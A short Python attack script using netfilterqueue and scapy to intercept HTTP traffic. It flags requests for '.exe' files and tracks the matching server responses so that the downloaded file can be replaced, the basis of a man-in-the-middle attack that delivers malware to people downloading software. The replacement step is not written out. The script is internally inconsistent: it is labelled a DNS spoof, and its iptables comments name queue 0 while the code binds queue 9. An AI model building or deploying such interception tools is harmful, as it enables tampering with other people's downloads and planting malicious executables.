#!/usr/bin/env python
#basic code of DNS spoof
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#at last execute ---- iptable --flush

import netfilterqueue
import scapy.all as scapy
from scapy.layers import http

ack_list = []

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80: #80 is port for http
			#print("[+] HTTP Request. ")
			if ".exe" in scapy_packet[scapy.Raw].load:
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)	
				print(scapy_packet.show())
		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing File. ")
				print(scapy_packet.show())		
		
	packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(9, process_packet)  
queue.run()


